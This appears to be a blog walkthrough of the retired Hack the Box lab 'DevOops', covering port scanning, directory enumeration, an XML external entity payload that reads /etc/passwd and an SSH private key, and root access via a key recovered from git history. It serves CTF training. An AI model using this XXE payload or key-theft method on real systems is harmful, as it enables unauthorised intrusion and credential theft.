@@ -1,0 +1,361 @@
+
+								
+																		Hack the Box: DevOops Walkthrough
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on October 14, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Today we are going to solve another CTF challenge “DevOops”. DevOops is a retired vulnerable lab presented by Hack the Box for helping pentester’s to perform online penetration testing according to your experience level; they have a collection of vulnerable labs as challenges, from beginners to Expert level.
+Level: Medium
+Task: To find user.txt and root.txt file
+Note: Since these labs are online available therefore they have a static IP. The IP of DevOops is 10.10.10.91
+Table of Content
+Scanning 
+
+Open ports and Running services (Nmap)
+
+Enumeration 
+
+Web Directory spidering 
+Upload XML file 
+
+Exploit XXE 
+
+Intercept Browser request (Burp Suite)
+Access /etc/passwd file
+Steal SSH RSA key
+
+Access Victim’s shell (SSH login)
+
+Capture user.txt flag
+
+Privilege Escalation
+
+Capture root.txt flag
+
+Walkthrough
+Scanning
+Let’s start off with our basic nmap command to find out the open ports and services.
+
+		
+		
+			
+			
+			
+			
+nmap -p- -A 10.10.10.91 --open
+			
+				
+					
+				
+					1
+				
+						nmap -p- -A 10.10.10.91 --open
+					
+				
+			
+		
+
+
+From Nmap scanning, we have enumerated port 22 and 5000 are only open ports on the target’s network, therefore firstly, let’s navigate to port 5000 through a web browser. By exploring the given URL, it puts up following web page as shown in the below image.
+
+		
+		
+			
+			
+			
+			
+http://10.10.10.91:5000
+			
+				
+					
+				
+					1
+				
+						http://10.10.10.91:5000
+					
+				
+			
+		
+
+
+Enumeration 
+Since we didn’t get any remarkable clue from the home page, therefore, we have opted Dirb tool for directory enumeration thus execute the following command.
+
+		
+		
+			
+			
+			
+			
+dirb http://10.10.10.91:5000
+			
+				
+					
+				
+					1
+				
+						dirb http://10.10.10.91:5000
+					
+				
+			
+		
+
+Hmm!! Here I received HTTP response 200 for /feed and /upload directories.
+
+So we explore http://10.10.10.91:5000/upload in the URL and further welcomed by following web Page given below. The following web page lets you upload an XML file, including XML elements Author, Subject and content. For that reason, we have created an XML file with the help of the following code and saved as 1.xml.
+
+		
+		
+			
+			
+			
+			
+&lt;?xml version="1.0"?&gt;
+  &lt;!DOCTYPE foo [
+   &lt;!ELEMENT foo ANY &gt;
+   &lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;
+  ]&gt;
+  &lt;feed&gt;
+    &lt;Author&gt;raj&lt;/Author&gt;
+    &lt;Subject&gt;chandel&lt;/Subject&gt;
+    &lt;Content&gt;&amp;xxe;&lt;/Content&gt;
+  &lt;/feed&gt;
+			
+				
+					
+				
+					12345678910
+				
+						&lt;?xml version="1.0"?&gt;  &lt;!DOCTYPE foo [   &lt;!ELEMENT foo ANY &gt;   &lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;  ]&gt;  &lt;feed&gt;    &lt;Author&gt;raj&lt;/Author&gt;    &lt;Subject&gt;chandel&lt;/Subject&gt;    &lt;Content&gt;&amp;xxe;&lt;/Content&gt;  &lt;/feed&gt;
+					
+				
+			
+		
+
+Then browse the XML file, which you have created and intercept the browser request with the help of burp suite while uploading.
+
+EXPLOIT XXE (XML External Entity)
+Now send the intercepted data to the repeater.
+Inside XML file, we have injected malicious code to make the call for /etc/passwd file, thus, we need to analyze its result in the repeater.
+
+And as you can observe from the given below image, the XML code is working wonderfully and throwing the content of /etc/passwd file to us.
+
+Similar, we extract the SSH RSA key by modifying XXE entry as shown in the below image. Now copy the whole key and save in a text file.
+
+Access Victim’s Shell
+Since we have copied RSA Private KEY in a text file named as “key”, then set permission 600 and try to login with the help of the following command.
+
+		
+		
+			
+			
+			
+			
+chmod 600 key
+ssh -i key roosa@10.10.10.91
+			
+				
+					
+				
+					12
+				
+						chmod 600 keyssh -i key roosa@10.10.10.91
+					
+				
+			
+		
+
+Boom!! We have spawned a shell of target machines, let’s go for the user.txt file.
+
+		
+		
+			
+			
+			
+			
+cd /home
+ls
+cd roosa
+ls
+cat user.txt
+			
+				
+					
+				
+					12345
+				
+						cd /homelscd roosalscat user.txt
+					
+				
+			
+		
+
+
+Privilege Escalation
+Great!!! We have completed the first task but for obtaining root.txt file we need to escalate the root privilege and to do so we traversed so many directories and files to get next clue.
+
+		
+		
+			
+			
+			
+			
+cd work
+ls
+cd blogfeed/
+ls
+cat run-gunicorn.sh
+cd resources
+ls
+			
+				
+					
+				
+					1234567
+				
+						cd worklscd blogfeed/lscat run-gunicorn.shcd resourcesls
+					
+				
+			
+		
+
+ 
+so we found .git directory here lets check git with the following command.
+
+		
+		
+			
+			
+			
+			
+git log
+			
+				
+					
+				
+					1
+				
+						git log
+					
+				
+			
+		
+
+And we obtain so many strings as shown in the following image which may perhaps SSH key for root login.
+
+So we try some key along git show command to demonstrate the output result. And obtain RSA Private Key which was not working properly.
+
+And finally, we got the original RSA Key which is highlighted in Red text, now copy the red color text a file and remove ‘–’ used in each line instead add “—–END RSA PRIVATE KEY—–”
+
+Since we have copied RSA Private KEY in a text file named as “rootkey” then set permission 600 and try to login with the help of the following command.
+
+		
+		
+			
+			
+			
+			
+chmod 600 key
+ssh -i rootkey root@10.10.10.91
+ls
+cat root.txt
+			
+				
+					
+				
+					1234
+				
+						chmod 600 keyssh -i rootkey root@10.10.10.91lscat root.txt
+					
+				
+			
+		
+
+Congrats!! We have found root.txt and from the image below you can see we have obtained the value of root.txt.
+
+Author: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
